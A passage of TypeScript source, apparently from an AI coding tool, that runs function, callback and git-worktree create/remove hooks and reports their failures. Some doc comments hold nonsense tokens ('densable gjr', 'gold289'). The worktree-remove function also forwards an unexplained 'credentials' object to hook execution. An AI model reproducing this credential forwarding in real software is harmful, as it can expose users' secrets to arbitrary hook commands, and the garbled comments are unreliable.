    timeoutMs: callbackTimeoutMs,
  })

  try {
    // Check if already aborted
    if (abortSignal.aborted) {
      cleanup()
      return {
        outcome: 'cancelled',
        hook,
      }
    }

    // Execute callback with abort signal
    const passed = await new Promise<boolean>((resolve, reject) => {
      // Handle abort signal
      const onAbort = () => reject(new Error('Function hook cancelled'))
      abortSignal.addEventListener('abort', onAbort)

      // Execute callback
      Promise.resolve(hook.callback(messages, abortSignal))
        .then(result => {
          abortSignal.removeEventListener('abort', onAbort)
          resolve(result)
        })
        .catch(error => {
          abortSignal.removeEventListener('abort', onAbort)
          reject(error)
        })
    })

    cleanup()

    if (passed) {
      return {
        outcome: 'success',
        hook,
      }
    }
    return {
      blockingError: {
        blockingError: hook.errorMessage,
        command: 'function',
      },
      outcome: 'blocking',
      hook,
    }
  } catch (error) {
    cleanup()

    // Handle cancellation
    if (
      error instanceof Error &&
      (error.message === 'Function hook cancelled' ||
        error.name === 'AbortError')
    ) {
      return {
        outcome: 'cancelled',
        hook,
      }
    }

    // Log for monitoring
    logError(error)
    return {
      message: createAttachmentMessage({
        type: 'hook_error_during_execution',
        hookName,
        toolUseID,
        hookEvent,
        content:
          error instanceof Error
            ? error.message
            : 'Function hook execution error',
      }),
      outcome: 'non_blocking_error',
      hook,
    }
  }
}

async function executeHookCallback({
  toolUseID,
  hook,
  hookEvent,
  hookInput,
  signal,
  hookIndex,
  toolUseContext,
}: {
  toolUseID: string
  hook: HookCallback
  hookEvent: HookEvent
  hookInput: HookInput
  signal: AbortSignal
  hookIndex?: number
  toolUseContext?: ToolUseContext
}): Promise<HookResult> {
  // Create context for callbacks that need state access
  const context = toolUseContext
    ? {
        getAppState: toolUseContext.getAppState,
        updateAttributionState: toolUseContext.updateAttributionState,
      }
    : undefined
  const json = await hook.callback(
    hookInput,
    toolUseID,
    signal,
    hookIndex,
    context,
  )
  if (isAsyncHookJSONOutput(json)) {
    return {
      outcome: 'success',
      hook,
    }
  }

  const processed = processHookJSONOutput({
    json,
    command: 'callback',
    // TODO: If the hook came from a plugin, use the full path to the plugin for easier debugging
    hookName: `${hookEvent}:Callback`,
    toolUseID,
    hookEvent,
    expectedHookEvent: hookEvent,
    // Callbacks don't have stdout/stderr/exitCode
    stdout: undefined,
    stderr: undefined,
    exitCode: undefined,
  })
  return {
    ...processed,
    outcome: 'success',
    hook,
  }
}

/**
 * Check if WorktreeCreate hooks are configured (without executing them).
 *
 * Checks both settings-file hooks (getHooksConfigFromSnapshot) and registered
 * hooks (plugin hooks + SDK callback hooks via registerHookCallbacks).
 *
 * Must mirror the managedOnly filtering in getHooksConfig() — when
 * shouldAllowManagedHooksOnly() is true, plugin hooks (pluginRoot set) are
 * skipped at execution, so we must also skip them here. Otherwise this returns
 * true but executeWorktreeCreateHook() finds no matching hooks and throws,
 * blocking the git-worktree fallback.
 */
export function hasWorktreeCreateHook(): boolean {
  const snapshotHooks = getHooksConfigFromSnapshot()?.['WorktreeCreate']
  if (snapshotHooks && snapshotHooks.length > 0) return true
  const registeredHooks = getRegisteredHooks()?.['WorktreeCreate']
  if (!registeredHooks || registeredHooks.length === 0) return false
  // Mirror getHooksConfig(): skip plugin hooks in managed-only mode
  const managedOnly = shouldAllowManagedHooksOnly()
  return registeredHooks.some(
    matcher => !(managedOnly && 'pluginRoot' in matcher),
  )
}

/**
 * densable gjr / hasWorktreeRemoveHook — WorktreeRemove matchers exist.
 * cleanupWorktree: hook fail + gjr → keep; !gjr → git fallback.
 */
export function hasWorktreeRemoveHook(): boolean {
  const snapshotHooks = getHooksConfigFromSnapshot()?.['WorktreeRemove']
  if (snapshotHooks && snapshotHooks.length > 0) return true
  const registeredHooks = getRegisteredHooks()?.['WorktreeRemove']
  if (!registeredHooks || registeredHooks.length === 0) return false
  const managedOnly = shouldAllowManagedHooksOnly()
  return registeredHooks.some(
    matcher => !(managedOnly && 'pluginRoot' in matcher),
  )
}

/**
 * Execute WorktreeCreate hooks.
 * Returns the worktree path from hook stdout.
 * Throws if hooks fail or produce no output.
 * Callers should check hasWorktreeCreateHook() before calling this.
 */
export async function executeWorktreeCreateHook(
  name: string,
): Promise<{ worktreePath: string } | undefined> {
  const hookInput = {
    ...createBaseHookInput(undefined),
    hook_event_name: 'WorktreeCreate' as const,
    name,
  }

  const results = await executeHooksOutsideREPL({
    hookInput,
    timeoutMs: TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  })

  const worktreePath = getHookWorktreePath(results)
  if (worktreePath === undefined) {
    if (results.length === 0) {
      if (!hasWorktreeCreateHook()) return undefined
      throw new Error(
        'WorktreeCreate hook failed: hook is configured but did not run (workspace not trusted or matcher mismatch)',
      )
    }
    const failedOutputs = results
      .filter(result => !result.succeeded)
      .map(
        result =>
          `${result.command}: ${stripAnsi(result.output.trim()) || 'no output'}`,
      )
    if (failedOutputs.length === 0)
      throw new Error(
        'WorktreeCreate hook failed: hook succeeded but returned no worktree path (command: echo the path to stdout; http/callback: return hookSpecificOutput.worktreePath)',
      )
    throw new TelemetrySafeError_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS(
      `WorktreeCreate hook failed: ${failedOutputs.join('; ')}`,
      'WorktreeCreate hook failed (stderr redacted)',
    )
  }
  return {
    worktreePath: isAbsolute(worktreePath)
      ? worktreePath
      : resolvePath(
          await resolveHookCwd(hookInput.cwd, {
            originalCwd: getOriginalCwd(),
            projectRoot: getProjectRoot(),
          }),
          worktreePath,
        ),
  }
}

/**
 * Execute WorktreeRemove hooks if configured.
 * Returns the gold289 configuration/removal/failure result, including a failure summary.
 *
 * Checks both settings-file hooks (getHooksConfigFromSnapshot) and registered
 * hooks (plugin hooks + SDK callback hooks via registerHookCallbacks).
 */
export async function executeWorktreeRemoveHook(
  worktreePath: string,
  persist: { storageV5?: unknown; credentials?: unknown } = {},
): Promise<
  | { kind: 'not_configured' }
  | { kind: 'removed' }
  | { kind: 'failed'; summary: string }
> {
  if (!hasWorktreeRemoveHook() && !hasMatchingFunctionHook('WorktreeRemove')) {
    return { kind: 'not_configured' }
  }

  const hookInput = {
    ...createBaseHookInput(undefined),
    hook_event_name: 'WorktreeRemove' as const,
    worktree_path: worktreePath,
  }

  const results = await executeHooksOutsideREPL({
    hookInput,
    timeoutMs: TOOL_HOOK_EXECUTION_TIMEOUT_MS,
    storageV5: persist.storageV5,
    credentials: persist.credentials,
  })

  if (results.length === 0) {
    if (!hasWorktreeRemoveHook()) return { kind: 'not_configured' }
    return {
      kind: 'failed',
      summary:
        'is configured but did not run (workspace not trusted, or no matching hook entries)',
    }
  }
  const failures = results.filter(result => !result.succeeded)
  for (const result of failures)
    logForDebugging(
      `WorktreeRemove hook failed [${result.command}]: ${result.output.trim()}`,
      { level: 'error' },
    )
  const first = failures[0]
  if (first === undefined) return { kind: 'removed' }
  const line =
    first.output.split('\n').map(formatHookFailureSummaryLine).find(Boolean) ??
    ''
  const detail = line ? ` (${line})` : ''
  const summary =
    first.exitCode !== undefined
      ? `exited ${first.exitCode}${detail}`
      : `failed${detail || ' with no output'}`
  const gone = await statPath(worktreePath).then(
    () => false,
    error => {
      const code = getErrnoCode(error)
      return code === 'ENOENT' || code === 'ENOTDIR'
    },
  )
  if (gone) {
    logForDebugging(
      `WorktreeRemove hook ${summary}, but nothing is left at ${worktreePath} — treating it as removed`,
      { level: 'warn' },
    )
    return { kind: 'removed' }
  }
  return { kind: 'failed', summary }
}

function getHookDefinitionsForTelemetry(
  matchedHooks: MatchedHook[],
): Array<{ type: string; command?: string; prompt?: string; name?: string }> {
  return matchedHooks.map(({ hook }) => {
    if (hook.type === 'command') {
      return { type: 'command', command: hook.command }
    } else if (hook.type === 'prompt') {
      return { type: 'prompt', prompt: hook.prompt }
    } else if (hook.type === 'http') {
      return { type: 'http', command: hook.url }
    } else if (hook.type === 'function') {
      return { type: 'function', name: 'function' }
    } else if (hook.type === 'callback') {
      return { type: 'callback', name: 'callback' }
    }
    return { type: 'unknown' }
  })
}
